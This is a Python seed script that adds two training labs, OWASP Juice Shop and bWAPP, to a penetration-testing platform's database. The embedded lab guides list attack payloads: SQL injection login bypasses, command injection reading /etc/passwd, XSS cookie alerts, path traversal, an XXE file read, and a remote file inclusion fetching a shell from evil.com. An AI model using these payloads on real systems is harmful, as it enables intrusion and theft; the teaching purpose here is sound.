"""
Seed script for additional intermediate labs
Creates 2 new labs using the existing pentest infrastructure
"""
import sys
import os
from sqlalchemy.orm import Session

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from database.connection import SessionLocal
from models.labs import Lab, LabDifficulty, LabType
import models.user

def seed_intermediate_labs():
    db = SessionLocal()
    try:
        print("Seeding additional intermediate labs...")
        
        # Lab 1: OWASP Juice Shop
        juice_shop_lab = {
            "title": "OWASP Juice Shop Challenges",
            "description": "Exploit a modern vulnerable web application. Practice XSS, SQL injection, broken authentication, and more using OWASP's flagship training app.",
            "docker_image": "bkimminich/juice-shop:latest",
            "difficulty": LabDifficulty.INTERMEDIATE,
            "category": "Web Security",
            "estimated_minutes": 90,
            "lab_type": LabType.GUACAMOLE,  # Using guacamole type for iframe-based labs
            "guacamole_url": "http://localhost:8087",  # Direct Juice Shop URL
            "compose_file": os.path.abspath(os.path.join(
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 
                "docker", "juice-shop", "docker-compose.yml"
            )),
            "content": """
# OWASP Juice Shop Challenges

## Introduction
OWASP Juice Shop is the most modern and sophisticated insecure web application. It contains over **100 security challenges** of varying difficulty.

## Getting Started
1. After starting the lab, Juice Shop opens in an iframe
2. Explore the application - it's a fake e-commerce site
3. Access the **Score Board** at `/score-board` to track challenges

## Challenge Categories

### 1. Injection Attacks ⭐⭐
**Challenge:** Login as admin without knowing the password

Try these in the login form:
```
Email: ' or 1=1--
Password: anything
```

Or use the email field:
```
admin@juice-sh.op'--
```

### 2. Broken Access Control ⭐⭐
**Challenge:** Access another user's shopping basket

1. Login as any user
2. Open browser DevTools (F12) → Network tab
3. Look for basket API calls
4. Try changing the basket ID in the URL

### 3. XSS (Cross-Site Scripting) ⭐
**Challenge:** Perform a DOM XSS attack

1. Go to the search bar
2. Try: `<iframe src="javascript:alert('xss')">`
3. Check the Score Board to verify

### 4. Sensitive Data Exposure ⭐
**Challenge:** Find the hidden Score Board

Hint: Try accessing `/score-board` directly or search the page source.

### 5. Broken Authentication ⭐⭐⭐
**Challenge:** Reset Jim's password

1. Go to Forgot Password
2. Enter Jim's email: `jim@juice-sh.op`
3. Find the security question answer (Star Trek reference!)

## Tools to Use
- **Browser DevTools** (F12) - Inspect network traffic and DOM
- **Burp Suite** (if installed) - Intercept and modify requests

## Scoring
Access the Score Board at `/score-board` to track your progress!

> **Tip:** Click the light bulb icon for hints on each challenge.
"""
        }

        # Lab 2: bWAPP - Buggy Web Application
        bwapp_lab = {
            "title": "bWAPP Security Exploitation",
            "description": "Practice over 100 web vulnerabilities in bWAPP (Buggy Web Application). Covers OWASP Top 10, injection flaws, and more with guided exercises.",
            "docker_image": "raesene/bwapp:latest",
            "difficulty": LabDifficulty.INTERMEDIATE,
            "category": "Web Security",
            "estimated_minutes": 75,
            "lab_type": LabType.GUACAMOLE,  # Using guacamole type for browser-based labs
            "guacamole_url": "http://localhost:8088",  # Direct bWAPP URL
            "compose_file": os.path.abspath(os.path.join(
                os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 
                "docker", "bwapp", "docker-compose.yml"
            )),
            "content": """
# bWAPP Security Exploitation

## Introduction
bWAPP (Buggy Web Application) is a deliberately insecure web application with over **100 vulnerabilities**. It covers all OWASP Top 10 risks and more.

## Getting Started
1. After starting the lab, bWAPP opens in a new tab
2. Login with: **bee** / **bug**
3. Click **"here"** to install the database (first time only)
4. Select a vulnerability from the dropdown and click **Hack**

## Vulnerability Categories

### 1. SQL Injection ⭐⭐
**Location:** SQL Injection (GET/Search)
```sql
-- Try in the search field:
' OR '1'='1
' UNION SELECT 1,user(),3,4,5,6,7--
```

### 2. Command Injection ⭐⭐
**Location:** OS Command Injection
```bash
# Try after the IP address:
; cat /etc/passwd
| whoami
`whoami`
```

### 3. XSS Reflected ⭐
**Location:** XSS - Reflected (GET)
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

### 4. XSS Stored ⭐⭐
**Location:** XSS - Stored (Blog)
```html
<script>alert(document.cookie)</script>
```

### 5. File Inclusion ⭐⭐⭐
**Location:** Remote & Local File Inclusion
```
# Local File Inclusion:
?language=../../../etc/passwd

# Remote File Inclusion:
?language=http://evil.com/shell.txt
```

### 6. Insecure Direct Object Reference ⭐
**Location:** Insecure DOR (Order Tickets)
- Change ticket ID in URL to access other orders

### 7. XML External Entity (XXE) ⭐⭐⭐
**Location:** XML External Entity Attacks
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<reset><login>&xxe;</login></reset>
```

## Security Levels
bWAPP has 3 security levels:
- **Low** - No protection (learning)
- **Medium** - Some filtering
- **High** - Strong protection

Start with **Low** and work your way up!

## Tools to Use
- **Browser DevTools** (F12) - Inspect requests
- **Burp Suite** - Intercept and modify traffic
- **SQLMap** - Automated SQL injection
- **curl** - Command-line requests

## Default Credentials
- Username: `bee`
- Password: `bug`

> **Tip:** Change the security level in the dropdown to practice bypassing filters!
"""
        }

        # Insert/Update labs
        for lab_data in [juice_shop_lab, bwapp_lab]:
            existing = db.query(Lab).filter(Lab.title == lab_data["title"]).first()
            if existing:
                print(f"Updating: {existing.title}")
                for key, value in lab_data.items():
                    setattr(existing, key, value)
            else:
                print(f"Creating: {lab_data['title']}")
                lab = Lab(**lab_data)
                db.add(lab)
        
        db.commit()
        print("\n✅ Intermediate labs seeded successfully!")
        print("\nLabs added/updated:")
        print("  1. OWASP Juice Shop Challenges")
        print("  2. bWAPP Security Exploitation")

    except Exception as e:
        print(f"Error: {e}")
        import traceback
        traceback.print_exc()
        db.rollback()
    finally:
        db.close()

if __name__ == "__main__":
    seed_intermediate_labs()
